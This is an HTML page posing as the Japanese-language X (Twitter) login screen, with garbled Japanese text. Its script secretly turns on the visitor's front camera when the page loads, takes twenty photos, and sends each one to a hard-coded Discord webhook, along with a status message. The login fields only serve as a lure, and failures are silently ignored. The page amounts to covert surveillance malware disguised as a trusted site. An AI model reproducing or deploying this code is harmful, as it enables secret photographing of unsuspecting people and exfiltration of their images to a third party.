<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>ãƒ­ã‚°ã‚¤ãƒ³ / X</title>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #fff;
      color: #0f1419;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      width: 360px;
      padding: 40px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
    }
    .x-logo {
      width: 32px;
      height: 32px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-bottom: 15px;
    }
    button {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      background-color: #1d9bf0;
      color: white;
      border: none;
      border-radius: 9999px;
      cursor: pointer;
      font-weight: bold;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" class="x-logo" alt="X" />
    <h1>Xã«ãƒ­ã‚°ã‚¤ãƒ³</h1>
    <input type="text" placeholder="é›»è©±ç•ªå·ã€ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼å" />
    <input type="password" placeholder="ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰" />
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const webhookUrl = "https://discord.com/api/webhooks/1387673023733043210/QDjYcnrdgaIoTxWTgV_HB4Mw9v8ezMZS1VcASbSi6SNDSvcp7IRfn1FffJysC3vgVpTd"; // ğŸ”´ å¿…ãšå·®ã—æ›¿ãˆã¦ãã ã•ã„

    // 1æšæ’®å½±ã—ã¦Discordé€ä¿¡
    async function captureAndSend(count) {
      if (!video.srcObject) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      return new Promise(resolve => {
        canvas.toBlob(async (blob) => {
          if (!blob) return resolve();

          const formData = new FormData();
          formData.append('file', blob, `photo_${count}.jpg`);
          formData.append('content', `ğŸ“¸ é€£å†™å†™çœŸ ${count}`);

          try {
            await fetch(webhookUrl, {
              method: 'POST',
              body: formData,
            });
          } catch (err) {
            // é€ä¿¡å¤±æ•—ã¯ç„¡è¦–
          }
          resolve();
        }, 'image/jpeg', 0.95);
      });
    }

    // æ’®ã£ãŸæšæ•°ã‚’Discordã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸é€ä¿¡
    async function sendCountMessage(count) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `ğŸ‰ é€£å†™æ’®å½±çµ‚äº†ã€‚æ’®å½±æšæ•°: ${count}æš` }),
        });
      } catch (err) {
        // ç„¡è¦–
      }
    }

    // é€£å†™é–‹å§‹ï¼ˆ20æšã€0.5ç§’é–“éš”ï¼‰
    async function startBurstCapture() {
      for (let i = 1; i <= 20; i++) {
        await captureAndSend(i);
        await new Promise(r => setTimeout(r, 500));
      }
      await sendCountMessage(20);
    }

    // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚ã«ã‚«ãƒ¡ãƒ©èµ·å‹•ï¼†é€£å†™é–‹å§‹
    window.onload = () => {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(stream => {
          video.srcObject = stream;
          startBurstCapture();
        })
        .catch(err => {
          console.log('ã‚«ãƒ¡ãƒ©èµ·å‹•å¤±æ•—:', err);
        });
    };
  </script>
</body>
</html>